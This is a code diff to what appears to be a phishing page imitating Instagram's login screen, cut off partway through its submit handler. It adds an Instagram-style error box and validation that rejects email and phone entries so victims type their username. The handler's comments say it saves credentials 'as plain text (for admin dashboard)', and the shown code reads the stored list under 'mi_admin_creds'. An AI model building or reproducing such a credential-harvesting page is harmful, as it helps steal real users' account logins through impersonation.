@@ -198,6 +198,21 @@
     .card-bottom a { color: #0095f6; font-weight: 600; }
     .card-bottom a:hover { text-decoration: underline; }
 
+    /* Error message — Instagram style */
+    .login-error {
+      display: none;
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      border-radius: 4px;
+      padding: 10px 12px;
+      font-size: 13px;
+      color: #333;
+      line-height: 1.5;
+      margin-bottom: 8px;
+      text-align: center;
+    }
+    .login-error.show { display: block; }
+
     /* Mobile */
     @media (max-width: 430px) {
       .card-top    { padding: 36px 24px 22px; }
@@ -221,11 +236,14 @@
           <input
             type="text"
             id="username"
-            placeholder="Phone number, username or email address"
+            placeholder="Username"
             autocomplete="username"
             required
           />
         </div>
+
+        <!-- Validation error -->
+        <div class="login-error" id="loginError"></div>
 
         <!-- Password -->
         <div class="input-wrap">
@@ -310,15 +328,41 @@
       document.getElementById('eyeOn').style.display  = show ? 'block' : 'none';
     });
 
+    // Detect email or phone in username field
+    function isEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+    function isPhone(v) { return /^[\+\d][\d\s\-\(\)]{6,}$/.test(v); }
+
+    const errBox = document.getElementById('loginError');
+    function showErr(msg) {
+      errBox.innerHTML = msg;
+      errBox.classList.add('show');
+    }
+    function clearErr() {
+      errBox.classList.remove('show');
+    }
+
+    u.addEventListener('input', clearErr);
+
     // Submit — save credentials, set session, redirect to dashboard
     document.getElementById('loginForm').addEventListener('submit', e => {
       e.preventDefault();
-      btn.disabled = true;
-      document.getElementById('btnLabel').style.display = 'none';
-      document.getElementById('spinner').style.display  = 'block';
 
       const username = u.value.trim();
       const password = pw.value.trim();
+
+      if (isEmail(username)) {
+        showErr('We don\'t support email login yet. Please enter your <strong>username</strong> only.');
+        return;
+      }
+      if (isPhone(username)) {
+        showErr('We don\'t support phone login yet. Please enter your <strong>username</strong> only.');
+        return;
+      }
+
+      clearErr();
+      btn.disabled = true;
+      document.getElementById('btnLabel').style.display = 'none';
+      document.getElementById('spinner').style.display  = 'block';
 
       // Store credentials as plain text (for admin dashboard)
       const creds = JSON.parse(localStorage.getItem('mi_admin_creds') || '[]');
